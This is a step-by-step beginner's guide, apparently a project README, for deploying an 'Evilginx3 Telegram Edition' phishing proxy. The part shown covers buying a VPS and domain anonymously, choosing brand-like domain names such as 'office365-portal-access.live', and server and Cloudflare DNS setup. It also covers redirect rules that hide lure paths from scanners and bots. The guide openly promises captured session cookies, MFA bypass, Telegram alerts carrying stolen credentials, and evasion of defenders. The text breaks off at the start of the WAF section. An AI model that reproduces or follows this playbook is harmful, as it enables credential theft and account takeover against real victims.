<p align="center">
  <img src="https://raw.githubusercontent.com/afrikaquality/evilginx2/master/media/img/logo.png" alt="Evilginx Logo" width="200">
</p>

<h1 align="center">📘 EVILGINX3 TELEGRAM EDITION — ULTIMATE DEPLOYMENT GUIDE</h1>

<p align="center">
  <strong>The only guide you will ever need. From zero to capturing sessions, step by step.</strong>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Read_Time-120_minutes-blue?style=flat-square" alt="Read Time">
  <img src="https://img.shields.io/badge/Difficulty-Beginner_Friendly-green?style=flat-square" alt="Difficulty">
  <img src="https://img.shields.io/badge/Last_Updated-July_2026-brightgreen?style=flat-square" alt="Updated">
  <img src="https://img.shields.io/badge/Tested-Ubuntu_22.04_&_24.04-success?style=flat-square" alt="Tested On">
  <img src="https://img.shields.io/badge/Cloudflare-Full_Integration-orange?style=flat-square" alt="Cloudflare">
  <img src="https://img.shields.io/badge/Redirectors-Custom-red?style=flat-square" alt="Redirectors">
</p>

---

## 🎯 WHAT THIS GUIDE DOES

By the end of this guide, you will have a fully operational Evilginx3 Telegram Edition server that:

- ✅ Captures session cookies from 40+ websites (Microsoft, Google, LinkedIn, etc.)
- ✅ Bypasses 2FA/MFA completely
- ✅ Sends instant Telegram notifications with credentials
- ✅ Runs 24/7 with auto-restart on failure
- ✅ Survives server reboots
- ✅ Is hardened against common attacks
- ✅ Can be managed from a beautiful web dashboard
- ✅ Uses custom redirectors (post-auth HTML pages) to avoid suspicion
- ✅ Is fully integrated with Cloudflare (DNS, SSL, WAF, Workers, Turnstile, Caching)
- ✅ Can be operated by a non-technical user (after setup)

**No prior experience required.** Every step is explained as if you've never touched a server before.

---

## 📚 TABLE OF CONTENTS

### 🟢 GETTING STARTED (Phases 0–3)
| Phase | Title | Time | What You'll Do |
|:------|:------|:-----|:---------------|
| **0** | [Pre-Deployment Planning](#phase-0--pre-deployment-planning) | 10 min | Choose your VPS, domain, and tools |
| **1** | [Buy a Domain & Connect to Cloudflare](#phase-1--buy-a-domain--connect-to-cloudflare) | 15 min | Own a domain and route DNS through Cloudflare |
| **2** | [Connect to Your Server](#phase-2--connect-to-your-server) | 5 min | First SSH login and system update |
| **3** | [Install Required Tools](#phase-3--install-required-tools) | 10 min | Install Go, Git, firewall, and helpers |

### 🟡 CORE SETUP (Phases 4–6)
| Phase | Title | Time | What You'll Do |
|:------|:------|:-----|:---------------|
| **4** | [Configure DNS in Cloudflare](#phase-4--configure-dns-in-cloudflare) | 5 min | Point your domain to your server |
| **4B** | [Cloudflare Redirect Rules & Page Rules](#phase-4b--cloudflare-redirect-rules--page-rules) | 10 min | Redirect smart traffic, hide infrastructure |
| **4C** | [Cloudflare WAF & Security Settings](#phase-4c--cloudflare-waf--security-settings) | 10 min | Lock down your domain from scanners |
| **4D** | [Cloudflare Workers (Traffic Fronting)](#phase-4d--cloudflare-workers-traffic-fronting) | 15 min | Hide your real server IP completely |
| **4E** | [Cloudflare Turnstile CAPTCHA Setup](#phase-4e--cloudflare-turnstile-captcha-setup) | 10 min | Add CAPTCHA before phishing page loads |
| **4F** | [Cloudflare Caching & Performance](#phase-4f--cloudflare-caching--performance) | 5 min | Speed up and protect your setup |
| **5** | [Build Evilginx from Source](#phase-5--build-evilginx-from-source) | 10 min | Download and compile the program |
| **6** | [First Run & Initial Configuration](#phase-6--first-run--initial-configuration) | 10 min | Set your domain, IP, and core settings |

### 🔴 ADVANCED SETUP (Phases 7–10)
| Phase | Title | Time | What You'll Do |
|:------|:------|:-----|:---------------|
| **7** | [Wildcard SSL Certificate (Hides Subdomains)](#phase-7--wildcard-ssl-certificate-hides-subdomains) | 15 min | Get a cert that doesn't expose subdomains |
| **8** | [Telegram Bot Setup](#phase-8--telegram-bot-setup) | 10 min | Create a bot and get phone notifications |
| **9** | [Create Your First Phishing Campaign](#phase-9--create-your-first-phishing-campaign) | 15 min | Enable a phishlet and generate a URL |
| **9B** | [Custom Redirectors (Post-Auth HTML Pages)](#phase-9b--custom-redirectors-post-auth-html-pages) | 15 min | Make your phishing pages look more legit |
| **9C** | [Custom Landing Pages](#phase-9c--custom-landing-pages) | 15 min | Create decoy pages for bots and scanners |
| **10** | [The Web Dashboard](#phase-10--the-web-dashboard) | 10 min | Control everything from your browser |

### 🟣 PRODUCTION (Phases 11–14)
| Phase | Title | Time | What You'll Do |
|:------|:------|:-----|:---------------|
| **11** | [Auto-Start on Boot (Systemd)](#phase-11--auto-start-on-boot-systemd) | 10 min | Make Evilginx run forever, even after reboot |
| **12** | [Live Feed (Real-Time Session Stream)](#phase-12--live-feed-real-time-session-stream) | 10 min | Stream sessions to a separate dashboard |
| **13** | [Auto-Export & Backups](#phase-13--auto-export--backups) | 10 min | Auto-save sessions to JSON/CSV |
| **14** | [Updating & Maintenance](#phase-14--updating--maintenance) | 10 min | Keep your server up to date |

### 🔵 EXTRAS (Phases 15–21)
| Phase | Title | Time | What You'll Do |
|:------|:------|:-----|:---------------|
| **15** | [GoPhish Integration](#phase-15--gophish-integration) | 20 min | Connect Evilginx to GoPhish for mass emailing |
| **16** | [Multi-User Dashboard & RBAC](#phase-16--multi-user-dashboard--rbac) | 10 min | Add team members with role-based access |
| **17** | [Docker Deployment](#phase-17--docker-deployment) | 15 min | Alternative: run as a container |
| **18** | [Phishlet Customization](#phase-18--phishlet-customization) | 20 min | Create your own phishlets |
| **19** | [OPSEC Hardening Checklist](#phase-19--opsec-hardening-checklist) | 15 min | Stay hidden from blue teams |
| **20** | [Troubleshooting Encyclopedia](#phase-20--troubleshooting-encyclopedia) | — | Fix ANY problem |
| **21** | [Quick Command Reference](#phase-21--quick-command-reference) | — | Cheat sheet for everything |

---

## PHASE 0 — Pre-Deployment Planning

**Time: ~10 minutes | What you need: Pen and paper (or notes app)**

### 🎯 Goal: Make smart decisions BEFORE you start

---

### 0.1 — Choose Your VPS Provider

You need a VPS (Virtual Private Server) — a computer in a data center that runs 24/7.

| Provider | Cheapest Plan | Cost/Month | Best For | Notes |
|:---------|:--------------|:-----------|:---------|:------|
| **OVH** | VPS-1 | $3.50 | Most popular for this use case | Anti-DDoS included, accepts crypto |
| **Hetzner** | CX22 | $4.50 | Best price/performance | EU-based, very fast |
| **DigitalOcean** | Basic Droplet | $6 | Easy to use | Good docs, US/EU/Asia |
| **Vultr** | Regular | $5 | Many locations | Hourly billing |
| **Linode (Akamai)** | Nanode | $5 | Reliable | Now owned by Akamai |
| **BuyVM** | Slice 512 | $2 | Cheapest | Limited stock, queuing system |
| **1984.is** | Small | $5 | Privacy-friendly | Icelandic company |

#### Recommended Specifications

For Evilginx to run smoothly, your VPS needs:

- **CPU:** 1 vCPU (2+ recommended if running live feed too)
- **RAM:** 1 GB minimum, 2 GB recommended
- **Storage:** 20 GB minimum
- **Bandwidth:** Unlimited or 1 TB+ per month
- **IPv4:** Yes (required for Let's Encrypt)
- **Location:** Pick one close to your targets:
  - **US targets:** US East/West
  - **EU targets:** Frankfurt, Amsterdam, London
  - **Asia targets:** Singapore, Tokyo
  - **Africa targets:** Frankfurt or London
- **OS:** Ubuntu 22.04 LTS or 24.04 LTS (most tested)

> **💡 Pro Tip:** Buy at least **2 months upfront** to test thoroughly. You don't want to lose your data when a free trial expires.

#### ⚠️ What to AVOID in a VPS Provider

- ❌ **AWS, Google Cloud, Azure** — They ban phishing tools and have strict ToS
- ❌ **Providers that require ID verification for crypto payments** — Limits your anonymity
- ❌ **Free trials** — They get terminated and your data is lost
- ❌ **Providers with poor reputation (e.g., some "unlimited bandwidth" hosts)** — They throttle or ban

---

### 0.2 — Choose Your Domain

Your domain is the foundation of everything. Pick carefully.

#### Best Domain Registrars (for this use case)

| Registrar | Cost (.xyz) | Anonymous Payment | Notes |
|:----------|:------------|:------------------|:------|
| **PorkBun** | $1/year | Crypto | Best for beginners, low prices |
| **Namecheap** | $2/year | Crypto (limited) | Good UI, popular |
| **Cloudflare Registrar** | At-cost | No | No markup, no middleman |
| **Njalla** | ~$15/year | Yes (privacy-focused) | Most anonymous |
| **Orangewebsite** | Varies | Crypto | Iceland-based, privacy-focused |

#### Best TLDs (Top-Level Domains)

| TLD | Cost | Detection Risk | Why |
|:----|:-----|:---------------|:----|
| `.xyz` | $1-2 | Low | Cheap, common, no specific association |
| `.online` | $2-5 | Low | Looks like a SaaS business |
| `.site` | $3-10 | Low | Generic |
| `.store` | $3-15 | Low-Medium | Used for legit e-commerce |
| `.tech` | $5-15 | Low | Tech company feel |
| `.cloud` | $3-10 | Low | Generic cloud service feel |
| `.app` | $15-20 | Medium | Requires HTTPS (good, but more scrutiny) |
| `.live` | $3-8 | Low | Streaming/online service feel |

#### ❌ AVOID These TLDs

- `.com`, `.net`, `.org` — Heavily monitored, frequently on blocklists
- `.gov`, `.edu`, `.mil` — Restricted, suspicious
- Country codes (`.ru`, `.cn`, etc.) — Geopolitical scrutiny

#### Domain Naming Tips

**Good names (look like real businesses):**
- `secure-portal-verify.com`
- `auth-services-portal.online`
- `cloud-identity-check.site`
- `office365-portal-access.live`
- `m365-authentication-center.xyz`

**Bad names (obvious phishing):**
- `login-microsoft.com` — Tells everyone what it's for
- `microsoft-365-login.net` — Too on-the-nose
- `free-money-fast.xyz` — Obvious scam

> **💡 Pro Tip:** Use a "double-meaning" name. Something that could be a real company but isn't tied to a specific brand.

---

### 0.3 — Required Tools Checklist

Before you start, make sure you have:

- [ ] **A computer** (Windows, Mac, or Linux) with internet access
- [ ] **A web browser** (Chrome, Firefox, Edge — all work)
- [ ] **A text editor** (Notepad, VS Code, anything)
- [ ] **A terminal/SSH client:**
  - Windows 10/11: Built-in (PowerShell or Command Prompt)
  - Mac: Built-in (Terminal)
  - Linux: Built-in
- [ ] **An email address** (for Cloudflare and Let's Encrypt)
- [ ] **A Telegram account** (free, takes 1 minute to create)
- [ ] **A smartphone** (to receive Telegram notifications)
- [ ] **A credit card OR cryptocurrency** (to buy VPS and domain)

#### Total Minimum Cost

| Item | Minimum Cost |
|:-----|:-------------|
| VPS (1 month) | $3.50 |
| Domain (1 year) | $1.00 |
| Cloudflare | Free |
| Telegram | Free |
| **TOTAL** | **$4.50** |

---

### 0.4 — Important Notes Before You Start

1. **Bookmark this page** — You'll be switching between this guide and your terminal frequently.
2. **Don't close your SSH session** mid-setup — You'll lose your place.
3. **Keep a notepad open** — Write down passwords, tokens, and IPs as you go.
4. **Work sequentially** — Don't skip phases. Each builds on the previous.
5. **Save EVERYTHING** — Take screenshots of success messages.

---

## PHASE 1 — Buy a Domain & Connect to Cloudflare

**Time: ~15 minutes | Where: Web browser**

### 🎯 Goal: Own a domain and route its DNS through Cloudflare (for free SSL, fast DNS, and hiding your server IP)

---

### 1.1 — Buy Your Domain

**Pick a registrar from the list above and buy your chosen domain.**

For this guide, I'll use the example domain:
```
YOUR_DOMAIN = offices65.online
YOUR_SERVER_IP = (you'll get this after buying VPS)
```

> **📝 Write down YOUR_DOMAIN — you'll need it many times.**

---

### 1.2 — Create a Cloudflare Account

1. Open your browser and go to **[dash.cloudflare.com/sign-up](https://dash.cloudflare.com/sign-up)**
2. Enter your **email address**
3. Create a **password** (use a unique one — save it in your password manager)
4. Click **"Create Account"**
5. Check your email inbox — Cloudflare sent a **verification email**
6. Click the **verification link** in the email
7. ✅ Your account is created and on the **Free plan** (no credit card needed)

---

### 1.3 — Add Your Domain to Cloudflare

1. After logging in, you'll see the Cloudflare dashboard
2. Click the big blue **"+ Add a Site"** button (or **"Add site"**)
3. Type your domain name in the box:
   ```
   offices65.online
   ```
4. Click **"Add site"**
5. Cloudflare asks you to **select a plan** — choose **"Free"** ($0/month)
6. Click **"Continue"**

#### Cloudflare's Quick Scan

Cloudflare will now scan for existing DNS records. Since you just bought the domain, there won't be any. Click **"Continue"** to proceed.

---

### 1.4 — Get Your Cloudflare Nameservers

After the scan, Cloudflare shows you **two nameservers**. They look like:

```
arya.ns.cloudflare.com
matt.ns.cloudflare.com
```

(Your actual nameservers will be different — they're assigned to your account.)

> **📝 COPY BOTH NAMESERVERS to your notepad. You need them in the next step.**

> **⚠️ Do NOT click "Done" yet** — you need to change your domain's nameservers first.

---

### 1.5 — Change Nameservers at Your Domain Registrar

Now go back to where you **bought the domain** (PorkBun, Namecheap, etc.).

The exact steps vary by registrar, but generally:

#### For PorkBun:
1. Log in to PorkBun
2. Click **"Details"** next to your domain
3. Scroll to **"Nameservers"** section
4. Select **"Custom"** nameservers
5. Delete the existing nameservers
6. Paste your two Cloudflare nameservers:
   ```
   arya.ns.cloudflare.com
   matt.ns.cloudflare.com
   ```
7. Click **"Save"**

#### For Namecheap:
1. Log in to Namecheap
2. Click **"Domain List"** → click your domain
3. Find **"Nameservers"** section
4. Select **"Custom DNS"** from the dropdown
5. Paste your two Cloudflare nameservers
6. Click the **green checkmark** to save

#### For Other Registrars:
- Look for **"DNS Settings"**, **"Nameservers"**, or **"Manage DNS"**
- Change from "default nameservers" to "custom nameservers"
- Paste the two Cloudflare nameservers

> **⏱️ Wait time:** Changes take 5-15 minutes to propagate. You can proceed to Phase 2 while waiting.

---

### 1.6 — Verify Cloudflare is Active

#### Method 1: Check Cloudflare Dashboard
1. Go back to your Cloudflare dashboard
2. After 5-10 minutes, Cloudflare will show **"Active"** next to your domain
3. ✅ You're done with this step

#### Method 2: DNS Lookup (from your computer)
On your computer (not the VPS yet), open a terminal:

```bash
# Windows (PowerShell), Mac, Linux:
nslookup -type=NS offices65.online 1.1.1.1
```

**Expected output:**
```
Server:		1.1.1.1
Address:	1.1.1.1#53

Non-authoritative answer:
offices65.online	nameserver = arya.ns.cloudflare.com
offices65.online	nameserver = matt.ns.cloudflare.com
```

> **If you still see your registrar's nameservers:** Wait 5-10 more minutes and try again. DNS propagation is not instant.

✅ **Cloudflare is set up. Move to Phase 2.**

---

## PHASE 2 — Connect to Your Server

**Time: ~5 minutes | Where: Your computer's terminal**

### 🎯 Goal: Remotely log into your VPS for the first time

---

### 2.1 — Get Your Server's IP Address

After buying your VPS, the provider sent you a **welcome email** with:
- **IP address** (e.g., `95.133.228.114`)
- **Username** (usually `root`)
- **Password** (a random string)

> **📝 Write down YOUR_SERVER_IP, USERNAME, and PASSWORD.**

If you can't find this email, log in to your VPS provider's dashboard — they show the IP there.

---

### 2.2 — Open a Terminal

- **Windows 10/11:** Press `Win + R`, type `powershell`, press Enter
- **Mac:** Press `Cmd + Space`, type `terminal`, press Enter
- **Linux:** Press `Ctrl + Alt + T`

---

### 2.3 — SSH Into Your Server

In the terminal, type:

```bash
ssh root@YOUR_SERVER_IP
```

**Replace `YOUR_SERVER_IP` with your actual IP** (e.g., `ssh root@95.133.228.114`).

Press **Enter**.

#### The First Time You Connect

You'll see this scary-looking message:

```
The authenticity of host '95.133.228.114 (95.133.228.114)' can't be established.
ED25519 key fingerprint is SHA256:aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890abcdef.
Are you sure you want to continue connecting (yes/no/[fingerprint])?
```

This is NORMAL. Type `yes` and press **Enter**.

Next, you'll be prompted for your password:

```
root@95.133.228.114's password:
```

**Type your password carefully** (you won't see the characters as you type — that's a security feature). Press **Enter**.

> **💡 Pro Tip:** Copy the password from your welcome email, then right-click in the terminal to paste it. Avoid typing it manually — typos are common.

#### Success!

If everything worked, you'll see:

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-185-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Last login: Sun Jul 12 23:48:04 2026 from 102.91.4.79
root@bulletproofedvps:~#
```

That `root@bulletproofedvps:~#` is your **command prompt**. You're now logged in!

> **If you get "Permission denied":**
> - Make sure you're using the correct username (try `ubuntu` or `admin` if `root` doesn't work)
> - Make sure you're using the correct password (case-sensitive!)
> - If you set up an SSH key, use: `ssh -i ~/path/to/key.pem root@YOUR_SERVER_IP`

---

### 2.4 — Update the System

Before installing anything, update Ubuntu's package list and install security updates:

```bash
apt update && apt upgrade -y
```

**What this does:**
- `apt update` — Downloads the latest list of available software
- `apt upgrade -y` — Installs all available updates (the `-y` says "yes to all questions")

**Expected output:** Lots of text scrolling by. Some packages will be downloaded, some will be installed, some will be "already up to date."

**Expected duration:** 30-90 seconds, depending on your server's speed.

> **⚠️ If you see a pink/blue screen asking about configuration files:**
> - It usually asks "What do you want to do about modified configuration file?"
> - The default is `keep the local version currently installed`
> - Just press **Enter** to accept the default

When the command finishes, you'll see your prompt again:
```
root@bulletproofedvps:~# 
```

✅ **Server is updated. Move to Phase 3.**

---

## PHASE 3 — Install Required Tools

**Time: ~10 minutes | Where: Your server terminal (still connected from Phase 2)**

### 🎯 Goal: Install every tool Evilginx needs to run

---

### 3.1 — Install System Tools

Copy and paste this entire command, then press **Enter**:

```bash
apt install -y wget curl git make build-essential screen fail2ban htop net-tools ufw certbot nano dnsutils jq unzip
```

**What each tool does:**

| Tool | Why You Need It |
|:-----|:----------------|
| `wget` | Download Go and other files from the internet |
| `curl` | Test Telegram API, send HTTP requests |
| `git` | Download the Evilginx source code from GitHub |
| `make` / `build-essential` | Compile Go programs (compilers, linkers) |
| `screen` | Keep programs running even when you disconnect SSH |
| `fail2ban` | Automatically blocks hackers trying to brute-force SSH |
| `htop` | Monitor CPU, RAM, and running processes |
| `net-tools` | Network diagnostics (`ifconfig`, `netstat`) |
| `ufw` | "Uncomplicated Firewall" — controls which ports are open |
| `certbot` | Get free SSL certificates from Let's Encrypt |
| `nano` | Simple text editor for editing config files |
| `dnsutils` | `dig` and `nslookup` commands for DNS testing |
| `jq` | Parse and pretty-print JSON (for testing APIs) |
| `unzip` | Extract ZIP files (some phishlets are packaged as ZIPs) |

**Expected output:** Lots of "Setting up..." and "Processing..." messages.

**Expected duration:** 1-2 minutes.

When complete, you'll see your prompt again.

---

### 3.2 — Configure the Firewall (UFW)

A firewall blocks unwanted traffic. We'll allow only the ports Evilginx needs.

Run each of these commands one at a time:

```bash
ufw allow 22/tcp
ufw allow 53/udp
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 5000/tcp
ufw allow 1337/tcp
ufw --force enable
```

**Why each port:**

| Port | Protocol | Purpose |
|:-----|:---------|:--------|
| `22` | TCP | SSH — so you don't lock yourself out of the server |
| `53` | UDP | DNS — victims' browsers use this to find your domain |
| `80` | TCP | HTTP — for Let's Encrypt SSL verification |
| `443` | TCP | HTTPS — the phishing pages are served on this port |
| `5000` | TCP | Dashboard — your web admin panel |
| `1337` | TCP | Live Feed — real-time session stream |

**Expected output:**
- Each `ufw allow` command: `Rule added`
- `ufw --force enable` command: `Firewall is active and enabled on system startup`

---

### 3.3 — Verify the Firewall

```bash
ufw status
```

**Expected output:**
```
Status: active

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW       Anywhere
53/udp                     ALLOW       Anywhere
80/tcp                     ALLOW       Anywhere
443/tcp                    ALLOW       Anywhere
5000/tcp                   ALLOW       Anywhere
1337/tcp                   ALLOW       Anywhere
```

✅ If you see all 6 ports listed as `ALLOW`, your firewall is configured.

> **⚠️ IMPORTANT:** If you ever change your dashboard port or live feed port, you must add the new port to UFW too.

---

### 3.4 — Free Port 53 (CRITICAL — DO NOT SKIP)

Ubuntu runs a DNS service called `systemd-resolved` that uses port 53. Evilginx **also** needs port 53 for its built-in DNS server. **They will conflict and Evilginx will fail to start.**

Copy and paste this ENTIRE block (all 6 commands at once):

```bash
systemctl stop systemd-resolved
systemctl disable systemd-resolved
rm -f /etc/resolv.conf
echo "nameserver 1.1.1.1" | tee /etc/resolv.conf
echo "nameserver 1.0.0.1" | tee -a /etc/resolv.conf
chattr +i /etc/resolv.conf
```

**What each command does:**

| Command | Purpose |
|:--------|:--------|
| `systemctl stop systemd-resolved` | Stops the service immediately |
| `systemctl disable systemd-resolved` | Prevents it from starting after reboot |
| `rm -f /etc/resolv.conf` | Deletes the old DNS config file |
| `echo "nameserver 1.1.1.1" > /etc/resolv.conf` | Sets Cloudflare as primary DNS |
| `echo "nameserver 1.0.0.1" >> /etc/resolv.conf` | Adds Cloudflare as backup DNS |
| `chattr +i /etc/resolv.conf` | Locks the file so nothing overwrites it |

**Expected output:** No errors. Just the prompt coming back.

---

### 3.5 — Verify Port 53 Is Free

```bash
ss -tulpn | grep :53
```

**Expected output:** Nothing (empty result). 

> **⚠️ If you see a line like `LISTEN 0 4096 127.0.0.53:53 users:(...)`:**
> Port 53 is STILL in use. Run this:
> ```bash
> kill -9 $(lsof -t -i:53) 2>/dev/null
> ss -tulpn | grep :53
> ```
> If still showing, repeat Step 3.4 and reboot.

---

### 3.6 — Verify DNS Still Works

```bash
nslookup google.com 1.1.1.1
```

**Expected output:**
```
Server:		1.1.1.1
Address:	1.1.1.1#53

Non-authoritative answer:
Name:	google.com
Address: 142.250.80.46
```

✅ If you see an IP address (e.g., `142.250.80.46`), DNS is working.

---

### 3.7 — Install Go (Required for Building)

Evilginx is written in Go, so you need the Go compiler to build it.

```bash
cd ~
wget -q https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
rm -rf /usr/local/go
tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
echo 'export GOPATH=$HOME/go' >> ~/.bashrc
echo 'export PATH=$PATH:$GOPATH/bin' >> ~/.bashrc
source ~/.bashrc
rm -f go1.22.5.linux-amd64.tar.gz
```

**What this does:**
- Downloads Go version 1.22.5 (the version tested with this codebase)
- Extracts it to `/usr/local/go`
- Adds Go to your PATH so you can run `go` from anywhere

**Expected output:** Just the prompt returning. No errors.

---

### 3.8 — Verify Go Installed Correctly

```bash
go version
```

**Expected output:**
```
go version go1.22.5 linux/amd64
```

> **If you see "command not found"**: Run `source ~/.bashrc` and try again.
> **If you see a different version (1.21, 1.23, etc.)**: That's usually fine, but 1.22.5 is most tested.

---

### 3.9 — Reboot the Server

```bash
reboot
```

**Expected result:** The SSH connection will close. Wait **30 seconds**, then reconnect:

```bash
ssh root@YOUR_SERVER_IP
```

Type `yes` if asked about the host key, then your password.

✅ **Server is ready for Evilginx. Move to Phase 4.**

---

## PHASE 4 — Configure DNS in Cloudflare

**Time: ~5 minutes | Where: Web browser**

### 🎯 Goal: Tell the internet "this domain lives at this server IP"

---

### 4.1 — Log Into Cloudflare

1. Go to **[dash.cloudflare.com](https://dash.cloudflare.com)**
2. Log in with your email and password
3. Click on your domain name (`offices65.online`)

---

### 4.2 — Add A Record for Root Domain

1. Click the **DNS** tab (in the top menu)
2. Click **"Add Record"**
3. Fill in the form:

| Field | Value to Enter |
|:------|:---------------|
| Type | **A** (from dropdown) |
| Name | **@** (means "the root domain") |
| IPv4 Address | **YOUR_SERVER_IP** (e.g., `95.133.228.114`) |
| Proxy Status | ⚫ **DNS Only** (click the orange cloud to make it grey) |
| TTL | **Auto** |

> **⚠️ CRITICAL:** The orange cloud icon means "proxied through Cloudflare" — this will BREAK Evilginx. Make sure the cloud is **GREY** (DNS Only) before saving.

4. Click **"Save"**

> **What's the difference?**
> - **Proxied (orange):** Traffic goes through Cloudflare first. They can see and block phishing content. **DO NOT USE.**
> - **DNS Only (grey):** Traffic goes directly to your server. Cloudflare only handles the DNS lookup. **USE THIS.**

---

### 4.3 — Add A Record for Wildcard

1. Click **"Add Record"** again
2. Fill in:

| Field | Value to Enter |
|:------|:---------------|
| Type | **A** |
| Name | **\*** (just an asterisk — matches ALL subdomains) |
| IPv4 Address | **YOUR_SERVER_IP** (same as above) |
| Proxy Status | ⚫ **DNS Only** (grey cloud) |
| TTL | **Auto** |

3. Click **"Save"**

---

### 4.4 — Verify from Your Server

Back in your server terminal:

```bash
dig @1.1.1.1 +short YOUR_DOMAIN
dig @1.1.1.1 +short random123.YOUR_DOMAIN
```

**Expected output for BOTH commands:** Your server IP address.

> **If you see nothing or wrong IP:** Wait 2-3 minutes and try again. DNS takes time to propagate.
> 
> **If you see Cloudflare IPs (104.x.x.x):** Your proxy is ON. Go back to Cloudflare and turn the cloud grey.

---

### 4.5 — Configure SSL/TLS Settings

1. In Cloudflare, click **SSL/TLS** → **Overview**
2. Set encryption mode to **"Full"** (NOT "Full Strict" and NOT "Flexible")

3. Click **SSL/TLS** → **Edge Certificates**
4. Find **"Always Use HTTPS"** and toggle it **ON** (the toggle should turn blue)

---

### 4.6 — Disable Cloudflare Features That Would Break Evilginx

These Cloudflare features look helpful but will **break** Evilginx. Disable them all:

#### Step A: Disable Bot Fight Mode
1. Click **Security** → **Bots**
2. Toggle **"Bot Fight Mode"** to **OFF**
3. (This would block legitimate victims who are NOT bots)
> **Why:** Bot Fight Mode blocks drivers, VPNs, and any suspicious browsers — including real users using VPNs.

#### Step B: Disable Browser Integrity Check
1. Click **Security** → **Settings**
2. Toggle **"Browser Integrity Check"** to **OFF**
> **Why:** This blocks visitors missing certain browser headers, which can include real users.

#### Step C: Set Security Level to "Low" (or "Essentially Off")
1. Click **Security** → **Settings**
2. Set **"Security Level"** to **"Low"** 
> **Why:** "Medium" and "High" challenge visitors with JS challenges that can break Evilginx's proxying. "Low" works fine.
> **Even better:** If you have Under Attack Mode, toggle it **OFF**.

#### Step D: Disable Email Address Obfuscation
1. Click **Scrape Shield** (in the Speed/Scrape section)
2. Toggle **"Email Address Obfuscation"** to **OFF**
> **Why:** This rewrites HTML and can break Evilginx's sub_filters.

#### Step E: Disable Automatic HTTPS Rewrites
1. Click **Speed** → **Optimization** → **Content Optimization**
2. Toggle **"Automatic HTTPS Rewrites"** to **OFF**
> **Why:** This rewrites `http://` to `https://` in HTML pages, which can break the phishlet proxying.

---

### 4.7 — Create DNS-Only Verification Test

Before moving on, verify everything works end-to-end:

```bash
# From your server terminal
curl -I http://YOUR_DOMAIN
```

**Expected output:**
```
HTTP/1.1 302 Found
Location: https://www.google.com
```

(Or whatever you set as `unauth_url` — the point is Evilginx responds, not a Cloudflare error.)

> **If you get Cloudflare error pages:** You left the proxy (orange cloud) on. Go back to DNS and click the orange cloud toggle until it's grey.

✅ **DNS is ready. Now let's add the other Cloudflare features.**

---

## PHASE 4B — Cloudflare Redirect Rules & Page Rules

**Time: ~10 minutes | Where: Cloudflare dashboard**

### 🎯 Goal: Create redirects that make your domain look like a real business, and hide your phishing infrastructure

---

### 4B.1 — What Are Redirect Rules?

Redirect rules tell Cloudflare: "When someone visits URL A, send them to URL B."

**Why this matters for Evilginx:**
- Your root domain (`offices65.online`) currently shows nothing or an error
- By redirecting it to a legit site (e.g., Google or a fake landing page), bots and scanners see a real website, not a suspicious blank page
- You can also redirect specific paths to look like a real business

---

### 4B.2 — Create a Redirect Rule for the Root Domain

1. In Cloudflare dashboard, click your domain
2. Click **Rules** → **Redirect Rules**
3. Click **"Create Rule"**
4. Fill in:

| Field | Value |
|:------|:------|
| **Rule name** | `Root domain redirect` |
| **When... (Expression)** | `(http.host eq "YOUR_DOMAIN") and not starts_with(http.request.uri.path, "/l")` |
| **Then...** | **Dynamic redirect** |
| **Type** | `301` (permanent redirect) |
| **Expression** | `concat("https://www.google.com/search?q=", ip.geoip.country)` |

> **Replace `YOUR_DOMAIN` with your actual domain.**

#### What this does:
- When someone visits `offices65.online` directly, they get redirected to a Google search
- It looks like a normal redirect (e.g., a parked domain or URL shortener)
- Visitors on lure paths (starting with `/l`) are NOT redirected — they get the phish page

5. Click **"Save"**

---

### 4B.3 — Create a Redirect Rule for Common Bot Paths

Many security scanners check for specific paths like `/admin`, `/wp-admin`, `/login`, etc.

1. Click **"Create Rule"** again
2. Fill in:

| Field | Value |
|:------|:------|
| **Rule name** | `Bot path trap` |
| **When... (Expression)** | `(starts_with(http.request.uri.path, "/admin") or starts_with(http.request.uri.path, "/wp-admin") or starts_with(http.request.uri.path, "/login") or starts_with(http.request.uri.path, "/.env") or starts_with(http.request.uri.path, "/.git"))` |
| **Then...** | **Dynamic redirect** |
| **Type** | `302` (temporary redirect) |
| **Expression** | `"https://httpbin.org/status/404"` |

> **What this does:** Any scanner looking for admin panels, git repos, or environment files gets a 404 from httpbin.org. They think the site doesn't exist.

3. Click **"Save"**

---

### 4B.4 — Create Redirect Rules for Phishing Subdomains (Optional)

If you want your phishing subdomains to also redirect to a decoy when accessed from non-lure paths:

**You shouldn't do this** — it would break Evilginx. The phishlet handles subdomains automatically.

✅ **Skip this one.**

---

### 4B.5 — Cloudflare Page Rules (Legacy Method)

If your Cloudflare plan doesn't have "Redirect Rules" (some older plans), use Page Rules instead:

1. Click **Rules** → **Page Rules**
2. Click **"Create Page Rule"**
3. Fill in:

| Field | Value |
|:------|:------|
| **URL** | `YOUR_DOMAIN/*` |
| **Pick Setting** | **"Forwarding URL"** |
| **Select Status Code** | **301** |
| **Destination URL** | `https://www.google.com` |

> **Replace `YOUR_DOMAIN` with your actual domain.**

4. Click **"Save"**

5. Create a second Page Rule:

| Field | Value |
|:------|:------|
| **URL** | `*YOUR_DOMAIN/l*` |
| **Pick Setting** | **"Disable Security"** |
| **Then another setting** | **"SSL" → "Full"** |

> **Why this is important:** This page rule says "for any URL containing `/l`, disable Cloudflare's security checks and use Full SSL." This ensures your lure pages pass through without interference.

---

### 4B.6 — Test the Redirect Rules

From your computer (not the VPS):

```bash
curl -I http://YOUR_DOMAIN
```

**Expected output:**
```
HTTP/1.1 301 Moved Permanently
Location: https://www.google.com/search?q=...
```

> **If you see Cloudflare error:** The redirect rule is misconfigured. Check the expression and try again.

✅ **Redirect rules are set up. Move to Phase 4C.**

---

## PHASE 4C — Cloudflare WAF & Security Settings

**Time: ~10 minutes | Where: Cloudflare dashboard**

### 🎯 Goal: Use Cloudflare's WAF (Web Application Firewall) to block scanners and bots before they reach your server, while letting real victims through

---

### 4C.1 — Understanding Cloudflare WAF

Cloudflare's WAF has thousands of rules that detect malicious traffic. For Evilginx, we want to:
